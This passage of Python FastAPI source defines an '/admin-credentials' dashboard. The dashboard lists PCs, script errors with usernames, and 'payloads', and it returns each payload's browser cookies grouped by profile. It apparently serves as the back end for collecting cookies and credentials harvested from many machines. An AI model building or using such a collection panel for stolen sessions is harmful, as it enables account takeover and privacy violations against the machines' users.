    const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
    const pcsEnvFilter = document.getElementById("pcs-env-filter");
    const pcsTableBody = document.getElementById("pcs-table-body");
    const pcsTableEmpty = document.getElementById("pcs-table-empty");
    const pcsPaginationInfo = document.getElementById("pcs-pagination-info");
    const pcsPageIndicator = document.getElementById("pcs-page-indicator");
    const pcsPrevBtn = document.getElementById("pcs-prev-btn");
    const pcsNextBtn = document.getElementById("pcs-next-btn");
    const pcsRefreshBtn = document.getElementById("pcs-refresh-btn");

    const PAGE_SIZE = 20;
    let pcsCurrentPage = 1;
    let pcsTotalPages = 0;

    async function loadPcsFilters() {
      const env = pcsEnvFilter.value || DEFAULT_ENVIRONMENT;
      const res = await adminFetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
      const data = await res.json();
      const prevEnv = pcsEnvFilter.value;
      pcsEnvFilter.innerHTML = "";
      const envs = data.environments.length ? data.environments : [DEFAULT_ENVIRONMENT];
      for (const e of envs) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        pcsEnvFilter.appendChild(opt);
      }
      pcsEnvFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes(DEFAULT_ENVIRONMENT) ? DEFAULT_ENVIRONMENT : envs[0]);
    }

    async function loadPcs(page = pcsCurrentPage) {
      pcsCurrentPage = page;
      const params = new URLSearchParams();
      params.set("environment", pcsEnvFilter.value || DEFAULT_ENVIRONMENT);
      params.set("page", String(pcsCurrentPage));
      params.set("page_size", String(PAGE_SIZE));

      const res = await adminFetch(`/admin-credentials/api/pcs?${params}`);
      const data = await res.json();

      pcsTotalPages = data.total_pages;
      pcsTableBody.innerHTML = "";
      pcsTableEmpty.hidden = data.total > 0;

      for (const item of data.items) {
        const tr = document.createElement("tr");

        const nameTd = document.createElement("td");
        nameTd.textContent = item.pc_name;
        tr.appendChild(nameTd);

        const envTd = document.createElement("td");
        envTd.textContent = item.environment;
        tr.appendChild(envTd);

        const tagTd = document.createElement("td");
        const input = document.createElement("input");
        input.className = "tag-input";
        input.type = "text";
        input.value = item.tag || "";
        input.placeholder = "e.g. Office laptop";
        tagTd.appendChild(input);
        tr.appendChild(tagTd);

        const actionsTd = document.createElement("td");
        const actions = document.createElement("div");
        actions.className = "row-actions";
        const saveBtn = document.createElement("button");
        saveBtn.type = "button";
        saveBtn.className = "primary";
        saveBtn.textContent = "Save";
        const status = document.createElement("span");
        status.className = "save-status";
        actions.appendChild(saveBtn);
        actions.appendChild(status);
        actionsTd.appendChild(actions);
        tr.appendChild(actionsTd);

        saveBtn.addEventListener("click", async (e) => {
          e.stopPropagation();
          status.textContent = "";
          status.style.color = "#22c55e";
          const res = await adminFetch(`/admin-credentials/pcs/${item.id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ tag: input.value }),
          });
          if (res.ok) {
            status.textContent = "Saved";
          } else {
            status.textContent = "Error";
            status.style.color = "#ef4444";
          }
        });

        pcsTableBody.appendChild(tr);
      }

      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
      const end = Math.min(data.page * data.page_size, data.total);
      pcsPaginationInfo.textContent = data.total
        ? `Showing ${start}–${end} of ${data.total}`
        : "No results";
      pcsPageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
      pcsPrevBtn.disabled = data.page <= 1;
      pcsNextBtn.disabled = data.page >= data.total_pages;
    }

    pcsEnvFilter.addEventListener("change", async () => {
      await loadPcsFilters();
      await loadPcs(1);
    });
    pcsRefreshBtn.addEventListener("click", async () => {
      await loadPcsFilters();
      await loadPcs(1);
    });
    pcsPrevBtn.addEventListener("click", () => {
      if (pcsCurrentPage > 1) loadPcs(pcsCurrentPage - 1);
    });
    pcsNextBtn.addEventListener("click", () => {
      if (pcsCurrentPage < pcsTotalPages) loadPcs(pcsCurrentPage + 1);
    });

    (async () => {
      await loadPcsFilters();
      if (!pcsEnvFilter.value) pcsEnvFilter.value = DEFAULT_ENVIRONMENT;
      await loadPcs(1);
    })();
  </script>"""

    scripts = scripts.replace("__DEFAULT_ENVIRONMENT__", json.dumps(ENVIRONMENT))

    return HTMLResponse(render_layout(title="PCs", active_tab="pcs", content=content, scripts=scripts))


@router.get("/admin-credentials/errors", response_class=HTMLResponse)
async def admin_errors_page() -> HTMLResponse:
    content = """
  <div class="container">
    <div class="toolbar">
      <label>
        Environment
        <select id="env-filter"></select>
      </label>
      <label>
        PC
        <select id="pc-filter">
          <option value="">All</option>
        </select>
      </label>
      <button type="button" id="refresh-btn">Refresh</button>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>PC</th>
            <th>Tag</th>
            <th>Code</th>
            <th>Message</th>
            <th>User</th>
            <th>Environment</th>
            <th>Datetime</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="table-body"></tbody>
      </table>
      <div id="table-empty" class="empty" hidden>No errors found.</div>
    </div>

    <div class="pagination">
      <div class="pagination-info" id="pagination-info"></div>
      <div class="pagination-controls">
        <button type="button" id="prev-btn">Previous</button>
        <span class="page-indicator" id="page-indicator"></span>
        <button type="button" id="next-btn">Next</button>
      </div>
    </div>

    <div id="error-modal-backdrop" class="modal-backdrop" hidden>
      <div class="modal" role="dialog" aria-modal="true">
        <div class="modal-header">
          <div class="modal-title" id="error-modal-title">Error details</div>
          <div class="modal-actions">
            <button type="button" id="error-modal-copy" class="primary">Copy JSON</button>
            <button type="button" id="error-modal-close">Close</button>
          </div>
        </div>
        <div class="modal-body">
          <pre id="error-modal-view"></pre>
          <div class="status" id="error-modal-status"></div>
        </div>
      </div>
    </div>
  </div>"""

    scripts = """
  <script>
    const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
    const envFilter = document.getElementById("env-filter");
    const pcFilter = document.getElementById("pc-filter");
    const tableBody = document.getElementById("table-body");
    const tableEmpty = document.getElementById("table-empty");
    const paginationInfo = document.getElementById("pagination-info");
    const pageIndicator = document.getElementById("page-indicator");
    const prevBtn = document.getElementById("prev-btn");
    const nextBtn = document.getElementById("next-btn");
    const refreshBtn = document.getElementById("refresh-btn");
    const errorModalBackdrop = document.getElementById("error-modal-backdrop");
    const errorModalTitle = document.getElementById("error-modal-title");
    const errorModalView = document.getElementById("error-modal-view");
    const errorModalStatus = document.getElementById("error-modal-status");
    const errorModalCopy = document.getElementById("error-modal-copy");
    const errorModalClose = document.getElementById("error-modal-close");

    const PAGE_SIZE = 20;
    let currentPage = 1;
    let totalPages = 0;
    let modalJson = "";

    function escapeHtml(value) {
      return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;");
    }

    async function copyText(text, statusEl) {
      statusEl.textContent = "";
      try {
        await navigator.clipboard.writeText(text);
        statusEl.textContent = "Copied";
      } catch (e) {
        statusEl.textContent = "Could not copy";
      }
    }

    function closeErrorModal() {
      errorModalBackdrop.hidden = true;
      errorModalStatus.textContent = "";
    }

    async function openErrorModal(errorId) {
      errorModalStatus.textContent = "";
      const res = await adminFetch(`/admin-credentials/errors/data/${errorId}`);
      if (!res.ok) {
        errorModalTitle.textContent = "Error not found";
        errorModalView.textContent = "";
        errorModalBackdrop.hidden = false;
        return;
      }

      const data = await res.json();
      const content = data.content || {};
      const code = content.code ?? "—";
      const message = data.message ?? "—";
      errorModalTitle.textContent = `Error #${data.id} · ${data.pc_name} · ${code} · ${message}`;
      modalJson = JSON.stringify(content, null, 2);
      errorModalView.textContent = modalJson;
      errorModalBackdrop.hidden = false;
    }

    async function loadFilters() {
      const prevEnv = envFilter.value;
      const filterParams = prevEnv ? `?environment=${encodeURIComponent(prevEnv)}` : "";
      const res = await adminFetch(`/admin-credentials/error-filters${filterParams}`);
      const data = await res.json();

      envFilter.innerHTML = '<option value="">All</option>';
      for (const e of data.environments) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        envFilter.appendChild(opt);
      }
      envFilter.value = [...envFilter.options].some(o => o.value === prevEnv) ? prevEnv : "";

      const prevPc = pcFilter.value;
      pcFilter.innerHTML = '<option value="">All</option>';
      for (const pc of data.pc_names) {
        const opt = document.createElement("option");
        opt.value = pc;
        opt.textContent = pc;
        pcFilter.appendChild(opt);
      }
      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
    }

    async function loadList(page = currentPage) {
      currentPage = page;
      const params = new URLSearchParams();
      if (envFilter.value) params.set("environment", envFilter.value);
      params.set("page", String(currentPage));
      params.set("page_size", String(PAGE_SIZE));
      if (pcFilter.value) params.set("pc_name", pcFilter.value);

      const res = await adminFetch(`/admin-credentials/api/errors?${params}`);
      const data = await res.json();

      totalPages = data.total_pages;
      tableBody.innerHTML = "";
      tableEmpty.hidden = data.total > 0;

      for (const item of data.items) {
        const tr = document.createElement("tr");
        const tagHtml = item.tag
          ? `<span class="tag-pill">${escapeHtml(item.tag)}</span>`
          : `<span class="tag-muted">—</span>`;
        tr.innerHTML = `
          <td class="mono">#${item.id}</td>
          <td>${escapeHtml(item.pc_name)}</td>
          <td>${tagHtml}</td>
          <td class="mono">${escapeHtml(item.code ?? "—")}</td>
          <td>${escapeHtml(item.message ?? "—")}</td>
          <td>${escapeHtml(item.username ?? "—")}</td>
          <td>${escapeHtml(item.environment)}</td>
          <td class="mono">${escapeHtml(item.datetime)}</td>
          <td><button type="button" class="error-details-btn">Details</button></td>`;
        tr.querySelector(".error-details-btn").addEventListener("click", () => openErrorModal(item.id));
        tableBody.appendChild(tr);
      }

      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
      const end = Math.min(data.page * data.page_size, data.total);
      paginationInfo.textContent = data.total
        ? `Showing ${start}–${end} of ${data.total}`
        : "No results";
      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
      prevBtn.disabled = data.page <= 1;
      nextBtn.disabled = data.page >= data.total_pages;
    }

    envFilter.addEventListener("change", async () => {
      await loadFilters();
      await loadList(1);
    });
    pcFilter.addEventListener("change", () => loadList(1));
    refreshBtn.addEventListener("click", async () => {
      await loadFilters();
      await loadList(1);
    });
    prevBtn.addEventListener("click", () => {
      if (currentPage > 1) loadList(currentPage - 1);
    });
    nextBtn.addEventListener("click", () => {
      if (currentPage < totalPages) loadList(currentPage + 1);
    });
    errorModalClose.addEventListener("click", closeErrorModal);
    errorModalCopy.addEventListener("click", () => copyText(modalJson, errorModalStatus));
    errorModalBackdrop.addEventListener("click", (event) => {
      if (event.target === errorModalBackdrop) closeErrorModal();
    });
    document.addEventListener("keydown", (event) => {
      if (event.key === "Escape" && !errorModalBackdrop.hidden) closeErrorModal();
    });

    (async () => {
      await loadFilters();
      await loadList(1);
    })();
  </script>"""

    return HTMLResponse(render_layout(title="Errors", active_tab="errors", content=content, scripts=scripts))


@router.get("/admin-credentials/payloads")
async def admin_list_payloads(
    environment: str | None = Query(default=None),
    pc_name: str | None = Query(default=None),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=20, ge=1, le=100),
) -> JSONResponse:
    items, total = list_payloads(
        environment=environment or None,
        pc_name=pc_name or None,
        page=page,
        page_size=page_size,
    )
    total_pages = (total + page_size - 1) // page_size if total else 0
    return JSONResponse(
        {
            "items": items,
            "total": total,
            "page": page,
            "page_size": page_size,
            "total_pages": total_pages,
        }
    )


@router.get("/admin-credentials/payloads/{payload_id}/cookies")
async def admin_get_profile_cookies(
    payload_id: int,
    profile: str = Query(..., min_length=1),
) -> JSONResponse:
    payload = get_payload_by_id(payload_id)
    if payload is None:
        return JSONResponse({"error": "not found"}, status_code=404)

    cookies_by_profile = group_cookies_by_profile(payload["content"])
    cookies = cookies_by_profile.get(profile)
    if cookies is None:
        return JSONResponse({"error": "profile not found"}, status_code=404)

    return JSONResponse({"profile": profile, "cookies": cookies, "count": len(cookies)})


@router.get("/admin-credentials/payloads/{payload_id}")
async def admin_get_payload(payload_id: int) -> JSONResponse:
    payload = get_payload_by_id(payload_id)
    if payload is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(payload)


@router.get("/admin-credentials/filters")
async def admin_filters(environment: str | None = Query(default=None)) -> JSONResponse:
    return JSONResponse(
        {
            "environments": list_distinct_environments(),
            "pc_names": list_distinct_pc_names(environment=environment or None),
        }
    )


@router.get("/admin-credentials/error-filters")
async def admin_error_filters(environment: str | None = Query(default=None)) -> JSONResponse:
    return JSONResponse(list_error_filter_options(environment=environment or None))


@router.get("/admin-credentials/api/errors")
async def admin_list_errors(
    environment: str | None = Query(default=None),
    pc_name: str | None = Query(default=None),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=20, ge=1, le=100),
) -> JSONResponse:
    items, total = list_script_errors(
        environment=environment or None,
        pc_name=pc_name or None,
        page=page,
        page_size=page_size,
    )
    for item in items:
        item["message"] = resolve_error_message(item.get("code"))
    total_pages = (total + page_size - 1) // page_size if total else 0
    return JSONResponse(
        {
            "items": items,
            "total": total,
            "page": page,
            "page_size": page_size,
            "total_pages": total_pages,
        }
    )


@router.get("/admin-credentials/errors/data/{error_id}")
async def admin_get_error(error_id: int) -> JSONResponse:
    error = get_script_error_by_id(error_id)
    if error is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    content = error.get("content") if isinstance(error.get("content"), dict) else {}
    error["message"] = resolve_error_message(content.get("code"))
    return JSONResponse(error)


@router.get("/admin-credentials/api/pcs")
async def admin_list_pcs_api(
    environment: str = Query(default=ENVIRONMENT),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=20, ge=1, le=100),
) -> JSONResponse:
    items, total = list_pcs(environment=environment or None, page=page, page_size=page_size)
    total_pages = (total + page_size - 1) // page_size if total else 0
    return JSONResponse(
        {
            "items": items,
            "total": total,
            "page": page,
            "page_size": page_size,
            "total_pages": total_pages,
        }
    )


@router.put("/admin-credentials/pcs/{pc_id}")
async def admin_update_pc(pc_id: int, body: PcTagBody) -> JSONResponse:
    updated = update_pc_tag(pc_id, body.tag)
    if updated is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(updated)
